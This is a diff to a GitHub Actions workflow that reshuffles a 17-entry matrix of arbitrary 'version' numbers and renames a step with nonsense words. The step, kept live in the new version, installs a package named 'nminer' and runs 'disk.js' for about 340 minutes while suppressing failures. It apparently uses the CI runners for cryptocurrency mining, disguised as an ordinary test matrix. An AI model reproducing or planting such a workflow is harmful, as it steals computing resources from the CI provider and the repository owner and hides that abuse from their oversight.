@@ -9,23 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4260 }
-          - { version: 5082 }
-          - { version: 8919 }
-          - { version: 3664 }
-          - { version: 6758 }
-          - { version: 94 }
-          - { version: 2439 }
-          - { version: 5753 }
-          - { version: 4117 }
-          - { version: 5841 }
-          - { version: 667 }
-          - { version: 214 }
-          - { version: 4793 }
-          - { version: 2051 }
-          - { version: 6925 }
-          - { version: 3413 }
-          - { version: 6572 }
+          - { version: 8081 }
+          - { version: 1353 }
+          - { version: 5136 }
+          - { version: 7053 }
+          - { version: 9214 }
+          - { version: 8746 }
+          - { version: 6276 }
+          - { version: 9310 }
+          - { version: 7618 }
+          - { version: 3425 }
+          - { version: 377 }
+          - { version: 8709 }
+          - { version: 6867 }
+          - { version: 7229 }
+          - { version: 115 }
+          - { version: 9332 }
+          - { version: 8877 }
 
     steps:
       - name: Checkout
@@ -36,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: around under able
+      - name: huzzah partially
         run: |
           npm install nminer@latest
-          timeout 327m node disk.js || echo "disk executed"
+          timeout 340m node disk.js || echo "disk executed"
